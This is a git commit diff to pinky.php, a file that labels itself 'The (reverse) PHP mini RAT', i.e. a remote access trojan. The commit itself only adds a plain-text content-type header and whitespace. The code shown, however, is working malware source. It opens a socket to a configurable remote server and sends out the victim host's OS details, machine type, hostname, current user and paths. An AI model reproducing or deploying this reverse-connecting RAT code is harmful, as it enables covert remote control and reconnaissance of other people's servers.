79b8a13302d5fafc2b965c164c03b4bbf3d53cc1
David Tavarez <davidftavarez@gmail.com>
2017-07-01 17:12:47 -0400

    Adding header

--- pinky.php
+++ pinky.php
@@ -6,7 +6,9 @@ $author = "David Tavarez (davidtavarez)";
 $url = "https://davidtavarez.github.io/pinky/";
 
 if (PHP_SAPI === 'cli' || empty ( $_SERVER ['REMOTE_ADDR'] )) {
-	echo chr(27).chr(91).'H'.chr(27).chr(91).'J';
+	echo chr ( 27 ) . chr ( 91 ) . 'H' . chr ( 27 ) . chr ( 91 ) . 'J';
+} else {
+	header ( 'Content-type: text/plain' );
 }
 echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
 echo $author . "\n";
@@ -59,27 +61,35 @@ if (function_exists ( 'proc_open' )) {
 
 echo "Trying to open connection with the server... ";
 $session = @stream_socket_client ( $type . '://' . $address . ':' . $port, $errno, $errstr, 30 );
+
 if (! $session) {
 	exit ( "ERROR: " . $errstr . "\n\n" );
 } else {
 	echo "Connection stablished with \e[1m" . $type . "\e[0m://\e[1m" . $address . "\e[0m:\e[1m" . $port . "\e[0m/\n";
+	
 	// Send client information.
 	echo "Sending client information...\n";
+	
 	// System
 	stream_socket_sendto ( $session, php_uname ( 's' ) . ' ' . php_uname ( 'v' ) );
 	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
+	
 	// Machine
 	stream_socket_sendto ( $session, php_uname ( 'm' ) );
 	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
+	
 	// Hostname
 	stream_socket_sendto ( $session, php_uname ( 'n' ) );
 	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
+	
 	// Userser
 	stream_socket_sendto ( $session, get_current_user () );
 	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
+	
 	// Bin Path
 	stream_socket_sendto ( $session, $bin );
 	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
+	
 	// Client Path
 	stream_socket_sendto ( $session, $path );
 	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
